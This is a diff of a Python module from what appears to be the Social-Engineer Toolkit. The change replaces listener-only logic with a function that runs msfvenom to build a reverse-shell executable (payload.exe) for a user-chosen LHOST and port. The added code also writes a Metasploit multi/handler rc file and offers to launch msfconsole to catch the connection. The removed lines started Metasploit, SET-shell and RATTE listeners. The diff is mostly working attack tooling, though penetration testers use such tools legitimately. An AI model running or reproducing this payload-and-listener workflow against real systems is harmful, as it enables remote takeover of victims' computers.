@@ -1,46 +1,41 @@
 #!/usr/bin/python
 import subprocess
-import os
-import re
-import sys
 from src.core.setcore import *
+from src.core.menu.text import *
+from src.core.dictionaries import *
 
 # definepath
 definepath=os.getcwd()
 sys.path.append(definepath)
-
 # grab the metasploit path 
 meta_path = meta_path()
 
-# launch msf listener
-print_info("The payload can be found in the SET home (/root/.set/) directory.")
-# j0fer 06-27-2012 # choice = raw_input(setprompt("0", "Start the listener now? [yes|no]"))
-choice = yesno_prompt("0", "Start the listener now? [yes|no]")
-# j0fer 06-27-2012 # if choice == "yes" or choice == "y":
-if choice == "YES":
-    # if we didn't select the SET interactive shell as our payload
-    if not os.path.isfile(setdir + "/set.payload"):
-        print_info("Please wait while the Metasploit listener is loaded...")
-        if os.path.isfile(setdir + "/meta_config"):
-            listen_path = (setdir + "/meta_config")
+# here we handle our main payload generation
+def payload_generate(payload, lhost, port):
+	# generate metasploit
+	subprocess.Popen(meta_path + "msfvenom -p %s LHOST=%s LPORT=%s --format=exe > %s/payload.exe" % (payload,lhost,port,setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
+	# write out the rc file
+	filewrite = file(setdir + "/meta_config", "w")
+	filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (payload,lhost,port))
+	filewrite.close()
+	print_status("Payload has been exported to the default SET directory located under: " + setdir + "/payload.exe")
 
-        if os.path.isfile(setdir + "/meta_config_multipyinjector"):
-            listen_path = (setdir + "/meta_config_multipyinjector")
+show_payload_menu2 = create_menu(payload_menu_2_text, payload_menu_2)
+payload=(raw_input(setprompt(["4"], "")))
+# if its default then select meterpreter
+if payload == "" : payload="2"
+# assign the right payload
+payload=ms_payload(payload)
+lhost=raw_input(setprompt(["4"], "IP address for the payload listener (LHOST)"))
+port = raw_input(setprompt(["4"], "Enter the PORT for the reverse listener"))
+# print to user that payload is being generated
+print_status("Generating the payload.. please be patient.")
+# generate the actual payload
+payload_generate(payload,lhost,port)
 
-        subprocess.Popen("%s/msfconsole -r %s" % (meta_path,listen_path), shell=True).wait()
+# start the payload for the user
+payload_query = raw_input(setprompt(["4"], "Do you want to start the payload and listener now? (yes/no)"))
+if payload_query.lower() == "y" or payload_query.lower() == "yes":
+	print_status("Launching msfconsole, this could take a few to load. Be patient...")
+	subprocess.Popen(meta_path + "msfconsole -r " + setdir + "/meta_config", shell=True).wait()
 
-    # if we did select the set payload as our option
-    if os.path.isfile(setdir + "/set.payload"):
-        if check_options("PORT=") != 0:
-            port = check_options("PORT=")
-
-        set_payload = file(setdir + "/set.payload", "r")
-
-        set_payload = set_payload.read().rstrip()
-        if set_payload == "SETSHELL":
-            print_info("Starting the SET Interactive Shell Listener on %s." % (port))
-            import src.payloads.set_payloads.listener
-            #subprocess.Popen("python src/payloads/set_payloads/listener.py %s" % (port), shell=True).wait()
-        if set_payload == "RATTE":
-            print_info("Starting the RATTE Shell on %s." % (port))
-            subprocess.Popen("src/payloads/ratte/ratteserver %s" % (port), shell=True).wait()
